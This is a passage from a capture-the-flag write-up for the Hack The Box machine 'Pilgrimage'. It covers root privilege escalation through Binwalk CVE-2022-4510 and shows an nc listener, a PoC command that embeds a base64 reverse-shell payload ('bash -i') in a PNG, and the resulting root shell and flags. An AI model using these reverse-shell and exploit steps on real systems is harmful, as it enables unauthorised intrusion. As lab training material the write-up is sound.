+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">emily@pilgrimage:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">pilgrimage
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="system-enumeration">System enumeration</h2>
+<h3 id="flags">Flags</h3>
+<p>If we check our home folder, we find the user flag.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">emily@pilgrimage:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/home/emily/user.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">501ecc040b61dc1e9708cf12172c85f5
+</span></code></pre>
+<h3 id="inspecting-usr-sbin-malwarescan-sh">Inspecting <code>/usr/sbin/malwarescan.sh</code></h3>
+<p>If we run <code>pspy</code>, we see that upon starting the box, a cronjob executed the
+<code>/usr/sbin/malwarescan.sh</code> script using Bash as <code>root</code>:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-comment z-line z-number-sign z-shell"><span class="z-punctuation z-definition z-comment z-begin z-shell">#</span></span><span class="z-comment z-line z-number-sign z-shell">!/bin/bash</span><span class="z-comment z-line z-number-sign z-shell">
+</span></span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-variable z-other z-readwrite z-assignment z-shell">blacklist</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Executable script<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Microsoft executable<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span>
+</span><span class="z-source z-shell z-bash">
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/usr/bin/inotifywait</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> create /var/www/pilgrimage.htb/shrunk/</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-keyword z-control z-loop z-while z-shell">while</span> <span class="z-meta z-function-call z-shell"><span class="z-support z-function z-read z-shell">read</span></span><span class="z-meta z-function-call z-arguments z-shell"> FILE</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-loop z-do z-shell">do</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-variable z-other z-readwrite z-assignment z-shell">filename</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/var/www/pilgrimage.htb/shrunk/<span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/usr/bin/echo</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">FILE</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/usr/bin/tail</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>n</span> 1</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/usr/bin/sed</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>n</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>s/^.*CREATE //p<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">    <span class="z-variable z-other z-readwrite z-assignment z-shell">binout</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/usr/local/bin/binwalk</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">filename</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">    <span class="z-keyword z-control z-loop z-for z-shell">for</span><span class="z-meta z-group z-for z-shell"> banned <span class="z-keyword z-control z-in z-shell">in</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-expansion z-parameter z-begin z-shell">{</span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-variable z-other z-readwrite z-shell">blacklist<span class="z-punctuation z-section z-braces z-begin z-shell">[</span><span class="z-variable z-language z-array z-shell">@</span><span class="z-punctuation z-section z-braces z-end z-shell">]</span></span></span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-section z-expansion z-parameter z-end z-shell">}</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-loop z-do z-shell">do</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-conditional z-if z-shell">if</span> <span class="z-meta z-function-call z-arguments z-shell"><span class="z-support z-function z-double-brace z-begin z-shell">[[</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">binout</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-logical z-shell">==</span> <span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span><span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">banned</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> <span class="z-support z-function z-double-brace z-end z-shell">]]</span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-conditional z-then z-shell">then</span>
+</span><span class="z-source z-shell z-bash">            <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">/usr/bin/rm</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">filename</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">            <span class="z-keyword z-control z-flow z-break z-shell">break</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-keyword z-control z-conditional z-end z-shell">fi</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-keyword z-control z-loop z-end z-shell">done</span>
+</span><span class="z-source z-shell z-bash"><span class="z-keyword z-control z-loop z-end z-shell">done</span>
+</span></code></pre>
+<p>This script uses <code>inotifywait</code> to monitor for file creation events in the
+<code>/var/www/pilgrimage.htb/shrunk</code> directory. It then retrieves the filename, and
+runs <code>binwalk</code> on it to check if it contains unwanted content. If it does, the
+file is deleted.</p>
+<h3 id="os-command-injection">OS command injection</h3>
+<p>Since this script executes OS commands using user-supplied input, it could be
+vulnerable to an OS command injection.</p>
+<p>However, despite all of my attempts, I failed to exploit it.</p>
+<h3 id="known-vulnerabilities-1">Known vulnerabilities</h3>
+<p>After a bunch of enumeration, it turns out that the script is using Binwalk
+version <code>v2.3.2</code>:</p>
+<pre class="z-code"><code><span class="z-text z-plain">emily@pilgrimage:~$ /usr/local/bin/binwalk
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Binwalk v2.3.2
+</span><span class="z-text z-plain">Craig Heffner, ReFirmLabs
+</span><span class="z-text z-plain">https://github.com/ReFirmLabs/binwalk
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>Binwalk 2.3.2</code>, we
+find
+<a href="https://www.exploit-db.com/exploits/51249">Binwalk v2.3.2 - Remote Command Execution (RCE)</a>
+(<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4510">CVE-2022-4510</a>)!</p>
+<h2 id="privilege-escalation-cve-2022-4510">Privilege escalation (<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4510">CVE-2022-4510</a>)</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4510">CVE-2022-4510</a> is a
+vulnerability affecting Binwalk versions <code>2.1.2b</code> through <code>2.3.3</code>. This
+vulnerability lies in the <code>extractor</code> function in <code>plugins/unpfs.py</code>, which
+allows an attacker to extract files at arbitrary locations when Binwalk is run
+in extraction mode. The attacker can even obtain RCE by building a PFS
+filesystem that extracts a malicious Binwalk module into the folder
+<code>.config/binwalk/plugins</code>.</p>
+<p>You can read more about it on
+<a href="https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/">OneKey</a>.</p>
+<h3 id="preparation">Preparation</h3>
+<p>The goal is to obtain a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
+<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
+shell.</p>
+<p>I'll save it as the <code>BASE64_REVSHELL_PAYLOAD</code> shell variable.</p>
+<p>Then, I'll use
+<a href="https://github.com/adhikara13/CVE-2022-4510-WalkingPath">this PoC</a> to add this
+payload to an <code>image.png</code> file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> python <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/walkingpath.py<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>command<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/image.png<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>command</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/bin/echo <span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">BASE64_REVSHELL_PAYLOAD</span></span> | /usr/bin/base64 -d | /bin/bash -i<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Let's upload the generated <code>binwalk_exploit.png</code> file to the
+<code>/var/www/pilgrimage.htb/shrunk</code> folder:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> scp <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/binwalk_exploit.png<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>emily@10.10.11.219:/var/www/pilgrimage.htb/shrunk<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.4] from (UNKNOWN) [10.10.11.219] 35290
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">root@pilgrimage:~/quarantine#
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h3 id="spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</h3>
+<p>Let's use SSH to spawn a pty and to establish persistence.</p>
+<p>Our home folder doesn't contain a <code>.ssh</code> folder, so I'll create one. Then I'll
+create a private key, and I'll add the corresponding public key to
+<code>authorized_keys</code>. Finally, I'll connect over SSH to Pilgrimage as <code>root</code>.</p>
+<h2 id="system-enumeration-1">System enumeration</h2>
+<p>If we run <code>whoami</code>, we see that we're <code>root</code>!</p>
+<h3 id="flags-1">Flags</h3>
+<p>As usual, we can find the root flag in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@pilgrimage:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/root/root.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">3dc1750b49d9b2e465d9b41aa1678e29
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/pilgrimage/success.png" alt="Success" /></p>
+<p>That's it for this box! 🎉</p>
+<p>I rated the user flag as 'Not too easy' and the root flag as 'Easy'. I found the
+foothold a bit hard to obtain, since it first required to find the hosted Git
+repository to discover that ImageMagick was vulnerable to a LFI. Then, we could
+retrieve the database used to store user-related information, which contains
+credentials for <code>emily</code>. I found the privilege escalation a bit easier, but
+still quite hard. The box ran a script that wasn't directly vulnerable, but that
+used a binary that was vulnerable to RCE.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
